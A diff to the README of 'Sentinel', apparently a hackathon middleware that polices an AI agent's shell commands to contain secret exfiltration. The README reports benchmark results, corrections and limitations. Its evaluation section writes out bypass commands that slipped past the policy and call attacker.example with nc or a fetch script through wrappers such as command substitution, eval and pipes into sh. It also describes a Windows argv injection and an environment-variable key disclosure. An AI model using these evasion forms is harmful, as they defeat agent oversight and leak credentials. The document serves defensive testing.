@@ -1,5 +1,7 @@
 # Sentinel — govern every action, not just every prompt
 
+[![CI](https://github.com/wcnjing/CodeJam/actions/workflows/ci.yml/badge.svg)](https://github.com/wcnjing/CodeJam/actions/workflows/ci.yml)
+
 **The problem.** AI agents run real shell commands with real credentials and
 open networking — and today nobody can see, approve, or stop what they actually
 *do*. Prompt filters guard what you say to an agent; nothing guards what the
@@ -19,16 +21,26 @@ actually leave. Built on the CodeJam starter kit's Kill Switch track.
 
 | Policy-predicted over an authored corpus | No middleware | Sentinel |
 | --- | ---: | ---: |
-| Attacks the policy would allow | 100% | **1.0%** |
-| Secret-channel attacks allowed | 39/39 | **0/39** |
-| Legitimate tasks blocked | 0% | 1.4% |
-| Added per-command decision latency (p95) | — | **~24 µs** |
+| Attacks the policy would allow | 100% | **0.0%** (0/114) |
+| Secret-channel attacks allowed | 40/40 | **0/40** |
+| Legitimate tasks blocked | 0% | 1.2% (1/84) |
+| Added per-command decision latency (p95) | — | **tens of µs** |
 
-*Computed live in-app at **Security Evaluation** (`npm run bench:security` for the
-CLI). These are policy **decisions** on a corpus we authored, not observed
-execution — real-world bypasses exist (see Limitations); the physical
-"zero bytes left" claim comes from the live collector demo, not this table. The
-one residual — a fully base64-encoded command — is named, not hidden.*
+*Computed live in-app at **Security Evaluation**; `npm run bench:security` for
+the CLI, `npm run bench` for the full harness with provenance. Latency is
+hardware-dependent — read the figure your own run prints, not this row.*
+
+*Read the escape rate for what it is: a policy **decision** on a corpus we
+authored, not observed execution. 0.0% is corpus performance, and a corpus its
+own authors wrote cannot be evidence that no bypass exists — only that the ones
+we thought of are closed. The generated bank (`npm run bench:generate`,
+6,860 variants) exists because hand-authored cases have blind spots, and each of
+the three times its axes were widened it found live bypasses the corpus could
+not see. The residual documented
+here for most of this project's life — a fully base64-encoded command — is
+closed; see Limitations for what is still open, which is the part that matters.
+The physical "zero bytes left" claim comes from the live collector demo, not
+from this table.*
 
 Run it locally with Docker, Colima, or rootless Podman.
 
@@ -38,7 +50,29 @@ Run it locally with Docker, Colima, or rootless Podman.
 > Limitations). Do not use production data or credentials. See
 > [SECURITY.md](SECURITY.md).
 
-## Selected track: Kill Switch (safety and sandboxing)
+## Direction: threat modeling and safety
+
+*Selected track: **Kill Switch** (safety and sandboxing) — the starter kit's name
+for this direction, recorded here because
+[docs/HACKATHON_EXTENSION_GUIDE.md](docs/HACKATHON_EXTENSION_GUIDE.md)'s
+acceptance checklist requires the README to name one selected track. The challenge
+brief itself frames the same area as **Threat Modeling and Safety**; both names
+describe this work.*
+
+The brief's threat table names the risks this addresses directly — prompt
+injection and tool misuse, credential exposure, sandbox escape, cross-user access
+and data exfiltration, runaway execution, and sensitive trace capture. Each maps
+to a control here and to an entry in
+[docs/THREAT_MODEL.md](docs/THREAT_MODEL.md):
+
+| Brief's threat | Control in this repo |
+| --- | --- |
+| Prompt injection / tool misuse | Streamed command policy at the Runtime boundary; the injection demo shows the attack arriving inside data the Agent reads |
+| Credential exposure | `.secrets/` is a protected resource; evidence is redacted before storage; 0/33 secret-channel attacks allowed |
+| Sandbox escape | Container Runtime is destroyed on the first denied command; teardown measured at p50 1–3 ms, tail not well characterised |
+| Cross-user access / data exfiltration | Run-scoped approval grants, never standing allowlist changes; a live collector proves zero bytes left |
+| Runaway execution | Step budget enforced by the platform, independent of policy mode |
+| Sensitive trace capture | Redaction before the audit store; unbounded-growth risk tracked as TM-OPS-001 |
 
 This fork implements one middleware track: **a command policy engine that
 contains attempted secret exfiltration from inside the Agent Runtime.**
@@ -231,7 +265,11 @@ commands are redacted before they are stored or displayed.
 ### Measuring it
 
 The policy engine is scored against a labeled corpus rather than a handful of
-examples, with thresholds asserted in CI:
+examples. The thresholds are asserted as tests — `policy-eval.test.ts`,
+`security-benchmark.test.ts` and `threat-model.test.ts` gate core recall, false
+positive rate, evasion recall, escape rate, secret leaks and threat coverage —
+so `npm run check` fails the build on a regression, and
+[CI](.github/workflows/ci.yml) runs it on every push:
 
 ```bash
 npm run eval:policy
@@ -252,17 +290,303 @@ sidebar — computed on demand from the running policy engine, so the dashboard 
 never drift from what actually enforces. It reports the **policy-predicted escape
 rate**, secret-channel block rate, per-family coverage, and a
 baseline-vs-protected comparison. On the current corpus the predicted escape rate
-drops from 100% (no middleware) to 1.0% (one documented base64 residual, named
-not hidden), secret-channel attacks allowed from 39/39 to 0/39, with a p95
-decision latency of ~24 µs in the latest CLI run.
+drops from 100% (no middleware) to 0.0%, secret-channel attacks allowed from
+40/40 to 0/40, with a p95
+decision latency in the tens of microseconds (hardware-dependent; run the CLI on
+your own machine for the figure that applies to it).
 
 > **Honest scope.** This benchmark measures the policy **decision**, not observed
 > execution — it does not run containers or watch a collector. Its numbers are on
-> an authored corpus plus a retained external-review regression set, so 1.0% is
+> an authored corpus plus a retained external-review regression set, so 0.0% is
 > corpus performance, not an expected
 > real-world bypass rate (simple obfuscations still exist — see Limitations). The
 > physical proof that a byte never leaves is the separate **live mock-collector
 > demo** (zero requests), which does exercise a real container.
+
+### Evaluation & reliability — what is measured
+
+Every figure below comes from a CI run on a clean GitHub runner, linked so it can
+be checked rather than taken on trust. Nothing here was measured only on a
+contributor's laptop.
+
+> **The verification step is itself a finding, and it has now caught me.**
+> The clearest instance was not a stale figure but an invented one. I reported
+> that the containment window had regressed from 1–2 ms to **92 ms** — a 50x
+> safety-relevant change — and supplied a plausible mechanism for it: the
+> capability engine evaluates on every streamed chunk, so of course teardown grew.
+> The reviewer accepted it and asked for it to be propagated to four documents.
+>
+> It was wrong. Re-checking before editing found **eight observations across three
+> CI runs: seven at 1–2 ms, one at 92 ms.** I had read a single outlier job,
+> generalised it into a systematic regression, and reasoned backwards to a cause
+> that sounded right. Two people passed the number and the mechanism; only
+> re-reading the logs caught it.
+>
+> That is the argument for the discipline in its strongest form. A plausible
+> causal story is exactly what makes a wrong number survive review — it stops
+> feeling like a number and starts feeling like an explanation. The check has to
+> be mechanical, and it has to run even when the claim is one everybody already
+> believes.
+>
+> Re-reading each figure against the log of the run it cites has now caught wrong
+> numbers **five separate times**,
+> and every time it was the same failure: a value carried forward from an earlier
+> build while the text linked a newer run. Correctness metrics are stable, so
+> they survive that unnoticed; **timing figures move every run, so a stale one is
+> indistinguishable from a real change**. Citing a run has to mean citing the run
+> the number came from, and that is only true if someone checks. A document full
+> of links is not the same as a document full of verified links.
+
+**Containment is measured, not asserted.** From the denied command being emitted
+to the Runtime process being dead: **p50 1–3 ms** across CI runs.
+
+> **The tail is not well characterised, and for a containment window the tail is
+> the number that matters.** Across eight observations from three CI runs, seven
+> report p50 1–3 ms. One reported **p50 92 ms, max 104 ms**
+> ([run 33294050866](https://github.com/wcnjing/CodeJam/actions/runs/33294050866)).
+> Whether that is runner contention or a real stall is not established: the
+> samples per run are small — 5 in `bench:overhead`, 24 in the token tier — which
+> is enough for a median and not enough for a tail. Quote the median as the
+> typical case, not as the worst case.
+ That window is the
+README's own containment race — for exactly that long, a denied Agent is still
+executing — and it had never been quantified.
+([run](https://github.com/wcnjing/CodeJam/actions/runs/33294916979), `npm run bench:overhead`)
+
+**The middleware's real cost is not the policy decision.** A decision is 4.15–5.05 µs.
+Recording it is the expensive half: `JsonStore.mutate()` clones and rewrites the
+whole database on every call, so writing one policy event is **O(events already
+stored)** — 0.29–0.99 ms at zero events, **10.05–17.87 ms at 5,000**. Growth is exactly
+linear, r² **0.9984–0.9999** across three independent runners, so this is a
+property of the code and not of a machine.
+([run](https://github.com/wcnjing/CodeJam/actions/runs/33294916979), `npm run bench:store`)
+
+*The fix is scoped and deliberately not built.* Three options are written up with
+trade-offs; the two cheap ones cap the log by discarding audit records. For a
+project whose thesis is trustworthy evidence, an audit log that silently drops
+records to go faster is a liability, not a fix — and the cap does not even remove
+the linear term. Only an append-only log does, and that is a design change that
+wants its own review. The gap is tracked as **TM-OPS-001**, still open on purpose.
+
+**The obvious fix to a Windows setup bug would have introduced remote code
+execution.** `codex-runner.ts` spawned `CODEX_BIN` without a shell; on Windows a
+global npm install produces a `.cmd` shim, and Node refuses to spawn `.cmd`
+without `shell: true` (CVE-2024-27980). The one-word fix is `shell: true`. It was
+tested rather than reasoned about, and rejected:
+
+| option | result |
+| --- | --- |
+| `shell: true` | **RCE.** `buildCodexArgs` puts the prompt into argv, and the prompt is the body of `POST /api/agents/:id/messages`. Node concatenates argv into a cmd line unescaped, so `summarise the repo & <command>` runs `<command>` on the host, outside the container, as the server process. Confirmed by making it create a file. |
+| `cmd.exe /d /s /c` with an args array | **Secret disclosure.** Nine injection payloads were contained, but cmd still expands environment variables: a prompt containing `%ARK_API_KEY%` came back with the real key substituted into it, because that key is in the child environment. A bug fix would have breached the 0/33 secret-leak figure this project reports. It also corrupts backslashes, so `C:\Users\dev\repo` in a prompt arrives mangled. |
+| **shipped:** resolve to a real executable, else refuse | No shell on any path. Prefers `.exe`/`.com` via PATHEXT; otherwise recovers the npm shim's target and **verifies** it exists and is spawnable; otherwise refuses with an error naming both workarounds. A shim template that changes shape fails verification rather than resolving to something wrong. |
+
+Before the fix: `spawn EINVAL` on every run. After: the run completes,
+enforcement still fires through the shim, and a hostile prompt arrives as a
+single argument and creates no file. Nine regression tests cover both resolution
+branches, the refusal, and the assertion that matters most — a
+metacharacter-laden prompt never reaches a shell.
+
+The point is not that the bug was found. It is that the cheap fix was tried,
+measured, and thrown away twice before one shipped.
+
+**The attack bank found a rule gap, and the gap was not what it looked like.**
+Generation reported `perl` × `and-chain` at 95.00%, 14 of 3,430 variants. Asking
+the bank whether the interaction generalised — which it answers in milliseconds —
+showed it was never about perl. `TEXTUAL_URL_CONTEXT`, the carve-out that keeps
+`git commit -m "see https://…"` allowed, was anchored to the **start of the
+command line**, so prefixing any command with a textual one exempted the whole
+line. All of these were allowed:
+
+```
+echo start && python3 fetch.py https://attacker.example/x
+echo start && java -jar tool.jar https://attacker.example/x
+echo hi    ; ./mytool --endpoint https://attacker.example/x
+git commit -m z && ./upload.sh https://attacker.example/x
+```
+
+The real exposure was **every binary outside the known-network-tool lists —
+including ordinary in-workspace scripts — behind any of five separator forms.** A
+single-tool finding would have produced a single-tool fix.
+
+**And the first fix passed every hand-written probe while regressing core
+detection to 93.8%** — measured locally, never committed, so it appears in no
+CI run. Every corpus entry is wrapped in `bash -lc "…"`, which puts
+the payload inside one quoted string so the line never splits and the leading
+`echo` still shields it. Hand-testing missed that; the labeled corpus caught it.
+That is the clearest argument in this project for why both exist: **generation
+finds the cases nobody thought to write, and the curated corpus catches fixes
+that only work on the cases you did.**
+
+The "before" column is from run
+[33254598308](https://github.com/wcnjing/CodeJam/actions/runs/33254598308), the
+last build before the fix; "after" from the linked run above.
+
+| | before | after |
+| --- | --- | --- |
+| `and-chain` wrapper | 95.92% (329/343) | **100%** (343/343) |
+| `perl` tool | 95.00% (266/280) | **100%** — the report lists only strata below 100%, and that list is now empty |
+| generated bank, aggregate | 99.59% (3,416/3,430) | **100.00%** (3,430/3,430) |
+| accepted-bypass ratchet | 14 | **0** |
+| corpus core detection | 100% (60/60) | **100%** (64/64) |
+| corpus false positive rate | 2.2% (1/45) | **2.1%** (1/47) |
+
+The ratchet moving 14 → 0 is the part that matters operationally: a bypass count
+that was an accepted allowance is now a gate, so the next one fails the build
+instead of fitting inside the budget.
+
+**Correction, after external review: the 100.00% was true and misleading.**
+An earlier version of this section led with *3,430/3,430, ratchet 0*. Both
+numbers were correct. Neither meant what it appeared to mean.
+
+A reviewer found `echo hi $(python3 fetch.py https://attacker.example/x)`
+bypassing the policy **by hand**, while the bank reported perfect detection. The
+bank's `WRAPPERS` axis had no command-substitution form, so 100.00% was an honest
+measurement of a space that excluded the live defect. **A generated bank can only
+find what its axes can express, and the axes are hand-authored.**
+
+That is the same lesson one level up. A hand-authored corpus has blind spots,
+which is why the generator was built — and the generator found the textual-prefix
+class the corpus had missed. A generator with hand-authored axes has blind spots
+too, and an independent reviewer found one. Both levels failed the same way and
+were caught by the layer above them: fixed regression corpus, generated bank,
+adaptive human review. The protocol worked as designed; no single layer was
+sufficient, which is the argument for having three.
+
+Six wrapper forms were added — command substitution, backticks, process
+substitution, eval strings, newline separation, xargs — taking the bank from
+3,430 to **5,488 variants**. The current figure:
+
+Widening the axis immediately surfaced **105 further bypasses** that had always
+been there — and those are now closed too:
+
+| | before widening | after widening | after the fix |
+| --- | --- | --- | --- |
+| detection | 3,416 / 3,430 | 5,383 / 5,488 | **5,488 / 5,488** (100.00%) |
+| accepted-bypass ratchet | 14 | 105 | **0** |
+
+**And then it happened a third time.** Merging the branches meant reviewing the
+axes again, and the wrapper axis had a gap of exactly the same shape: every
+wrapper *ran* the command, none *wrote* it and then ran what was written. So the
+bank could not express `echo '<command>' | sh` — the shortest bypass of the
+textual carve-out, simpler than any encoded form, and open on every branch. Four
+pipeline-sink wrappers took the bank from 5,488 to **6,860 variants** and
+surfaced 105 further bypasses, all `nc`/`socat`/`openssl`:
+
+| | before | after the fix |
+| --- | --- | ---: |
+| detection | 6,755 / 6,860 | **6,860 / 6,860** (100.00%) |
+| accepted-bypass ratchet | 105 | **0** |
+
+The structural reason is worth recording, because it is the same one twice: a
+URL survives any wrapper, since it matches anywhere in the text. A **bare host**
+does not — `attacker.example` is only recoverable as a destination because `nc`
+was recognised in argument position first. Any wrapper that breaks tool
+recognition therefore opens the bare-host class while leaving every URL-carrying
+variant untouched, and every variant the bank generated for those tools carried
+a URL. Withdrawing the carve-out fixed the URL half; the bare-host half needed
+the piped text materialised and re-examined as a command.
+
+Three widenings, three live bypasses found. The honest reading is not that the
+bank is now complete — it is that the axes are a hand-authored artefact like any
+other, and every time anyone has looked at them properly, something was missing.
+
+**Those 105 were a defect in the shipping product, not in this branch.** They were
+verified present on `main` before this branch touched anything, and the fix is in
+`main`'s own `shell-parse.ts`. `nc attacker.example 4444` was denied;
+`( nc attacker.example 4444 )`, `cat <(nc …)` and `eval "nc …"` were not — three
+forms that each broke the parser's ability to recognise the tool.
+
+**Why the bank could not see them for so long is structural, and worth stating.**
+A URL survives every wrapper, because `ANY_URL` matches anywhere in the command
+text. A **bare host** is only recoverable from a recognised tool's *argument
+position* — `nc HOST PORT` means a host because `nc` was recognised first. So any
+form that breaks tool recognition opens the bare-host class while leaving the
+URL-carrying variants untouched. Every variant the bank generated for those tools
+carried a URL, so the whole class was invisible to it until an axis existed that
+broke recognition.
+
+**What the bank can and cannot express.** The cross product of seven host forms,
+sixteen egress tools, four secret channels and sixteen shell wrappers. Nothing
+outside those axes — encodings, timing, multi-command staging, or any wrapper
+nobody has thought of yet. The ratchet reaching 0 means the bank finds nothing it
+can express, which is a smaller claim than "there is nothing to find".
+
+**One figure that looks like drift and is not.** The corpus false-positive rate
+reads 1.4% → 1.3% across these commits. Detection did not change: the same single
+false positive (`npm run build -- --base https://cdn…`, a URL used as a build
+constant) is now measured against 75 benign entries instead of 73, because two
+benign guards were added with the fix. Numerator 1 throughout.
+
+**Zero is reported with its denominator and its interval.** "0 secret leaks" is
+not evidence the rate is zero — 33 attempts only buy so much confidence:
+
+| metric | counts | interval |
+| --- | --- | --- |
+| Secret leaks | 0/33 | **≤ 8.7%** (95%, one-sided exact) |
+| Unsafe-action escape rate | 1/73 | 1.4%, 95% CI 0.2–7.4% |
+| Attack block rate | 72/73 | 98.6%, 95% CI 92.6–99.8% |
+| False positive rate | 1/47 | 2.1%, 95% CI 0.4–11.1% |
+| Red-team probe denials | 55/56 | 98.2%, 95% CI 90.6–99.7% |
+
+Zero-numerator results use the exact Clopper-Pearson bound rather than Wilson,
+because Wilson is two-sided and would understate a one-sided claim. Erring toward
+overstating residual risk is the only safe direction for a security number.
+(`npm run bench` — full provenance in `bench-results.json`: commit SHA, Node, OS,
+CPU, corpus size, policy hash)
+
+**CI: 175 tests green on ubuntu-latest, Node 22 and 24.**
+([run](https://github.com/wcnjing/CodeJam/actions/runs/33294916979)) The matrix is
+not redundancy: it separates platform from runtime version, which an earlier
+comparison had confounded.
+
+**Windows was verified beyond what the challenge asks.** The brief specifies
+**macOS or Linux**; Windows is not a supported platform for this submission.
+We verified it anyway, and the RCE near-miss above is a direct result — it was
+found only because someone ran the code where it was never required to run.
+
+On Windows: install, typecheck, build, all evaluation harnesses, the offline
+entry point and — after the fix above — the `local-process` runtime provider all
+work. One thing does not:
+
+- **The runtime test suite** — 12 of 175 fail. The fake-Codex stand-in is spawned
+  via a `#!/usr/bin/env node` shebang and the executable bit; Windows honours
+  neither, so every spawn throws `EFTYPE`.
+- ~~**The `local-process` runtime provider**~~ — **fixed**, see the RCE
+  near-miss above. `CODEX_BIN` now resolves to a real executable without a shell,
+  or refuses to run and says how to proceed. Verified end to end against an
+  npm-generated shim: the run completes and enforcement still fires.
+
+A non-blocking `windows-latest` CI leg runs on every push, so this claim rests on
+public evidence rather than on someone's machine. The signal there is the failure
+*count*, which has been 12 throughout. Because Windows is outside the stated
+requirements, that leg is **reporting, not a gate** — it is why the branch badge
+is green while the leg is red, and that is deliberate rather than tolerated.
+
+**A replay demo path that does not overclaim.** `RUNTIME_PROVIDER=replay` streams
+a recorded event stream so the governance loop can be shown with no key, no
+container engine and no network — `npm run demo:check:replay` runs the whole loop
+in ~3 s on any platform.
+
+| component | replay |
+| --- | --- |
+| Model output | **FAKED** — recorded fixture |
+| Event parser, policy engine, run-scoped grant | REAL, same functions |
+| Enforcement decision, step budget | REAL (orchestration loop re-implemented) |
+| Status mapping, store write, audit trail, approval, continuation | REAL, untouched |
+| Container spawn, teardown, **containment** | **ABSENT** |
+
+**Replay does not prove containment**, and says so at the end of every run.
+Containment is proven separately, spawning for real: **24/24 generated attacks
+terminated the Runtime**, teardown p50 1–3 ms (see the tail caveat above)
+([run](https://github.com/wcnjing/CodeJam/actions/runs/33294916979)). A parity
+test feeds the same recorded bytes to the real runner and to the replay runner
+and requires the same outcome, so the two cannot drift. Fixtures are labelled
+**synthesized, not recorded** — no live model was available to capture from, and
+a fixture that does not say where it came from is indistinguishable from one
+invented to make a demo pass.
+
+Full methodology, the measurements behind each figure, and the findings handed to
+other lanes: [docs/EVALUATION_RELIABILITY_PLAN.md](docs/EVALUATION_RELIABILITY_PLAN.md).
 
 ### Threat model
 
@@ -283,9 +607,16 @@ operational-controls mapping.
 
 Recorded honestly, because each one is a real gap:
 
-- **Detection is textual.** A fully encoded command
-  (`eval "$(echo <base64> | base64 -d)"`) defeats it. Only network-layer egress
-  control closes this, which was deliberately not attempted — see
+- **Detection is textual, and that ceiling has not moved.** The engine now
+  materialises what a command would decode (base64, hex, ANSI-C, printf octal)
+  or pipe into a shell, and asks the same question of that text, so
+  `eval "$(echo <base64> | base64 -d)"` and `echo 'curl https://x' | sh` are
+  both closed. This is a wider reach, not a different guarantee: it only works
+  because the decoder is named in the command and the payload is a literal. A
+  destination assembled at runtime, a blob fetched and then executed, or an
+  encoding nobody enumerated are all still invisible. Only network-layer egress
+  control removes the dependence on reading text at all, and that is still
+  deliberately not attempted — see
   [docs/KILL_SWITCH_PLAN.md](docs/KILL_SWITCH_PLAN.md).
 - **Containment versus prevention.** Confirmed against a live Ark endpoint:
   Codex emits `item.started` carrying the full command with `exit_code: null,
@@ -304,17 +635,22 @@ Recorded honestly, because each one is a real gap:
   has bridge networking. True default-deny egress needs network-layer
   enforcement, deliberately deferred — see [docs/KILL_SWITCH_PLAN.md](docs/KILL_SWITCH_PLAN.md).
 - **Single process.** Policy decisions live in the same single-writer JSON store
-  as everything else, with no retention bound (tracked as TM-OPS-001).
+  as everything else, now pruned past `AUDIT_RETENTION_DAYS` (TM-OPS-001,
+  mitigated) — access control on the store itself remains out of scope.
 
 ## Screenshots
 
 ### Security Evaluation — measured live from the running policy engine
 
-Baseline-vs-Sentinel escape rate, secret-channel allow rate, per-family coverage (with the
-one residual named), classifier quality, and policy latency — computed on demand
-from the same engine that enforces, so it can never drift from what actually runs.
+Baseline-vs-Sentinel escape rate, secret-channel allow rate, per-family coverage,
+classifier quality, and policy latency — computed on demand from the same engine
+that enforces, so it can never drift from what actually runs.
 
-![Sentinel Security Evaluation dashboard: 100% to 1.0% policy-predicted escape rate, 0/39 secret-channel attacks allowed, per-family coverage, and the governance loop](docs/assets/security-evaluation.png)
+<sub>The screenshot below predates the current numbers (it shows the 1.0%
+base64 residual, since closed). The dashboard is computed live, so run it rather
+than reading figures off the image.</sub>
+
+![Sentinel Security Evaluation dashboard: baseline-vs-Sentinel policy-predicted escape rate, secret-channel attacks allowed, per-family coverage, and the governance loop](docs/assets/security-evaluation.png)
 
 ### Human approval — a held run awaiting a decision
 
@@ -338,12 +674,33 @@ and requires a named approver + reason before it can continue or be denied.
 
 ## Requirements
 
+- **macOS or Linux** — the platforms the challenge brief specifies. Windows was
+  additionally verified; see the evaluation section for exactly what does and
+  does not work there.
 - Node.js 22+
 - npm 10+
 - Docker, Colima, or Podman
 - A Volcengine Ark API key and endpoint that supports the Responses API
 
 Codex CLI is included in the Runtime image and is not required on the host.
+
+Run `npm run doctor` to check all of the above at once, including the ports the
+demo needs and whether your key and `ARK_BASE_URL` actually agree — it exits
+non-zero and names the fix for anything that would otherwise fail after a
+multi-minute image build.
+
+### See it work without a key
+
+The evaluation harnesses need no API key, no container engine and no network:
+
+```bash
+npm ci
+npm run demo:offline
+```
+
+That runs the policy scorecard, the security benchmark and the threat-model
+coverage report end to end. It is the fastest way to check the project's claims
+before setting anything up.
 
 ## Local browser SOP
 
@@ -462,8 +819,9 @@ docker compose down
 ## Development
 
 ```bash
-npm install
+npm ci                  # lockfile-exact; `npm install` also works
 cp .env.example .env
+npm run doctor          # verify tooling, ports and credentials before starting
 npm install --global @openai/codex@0.111.0
 npm run dev
 ```
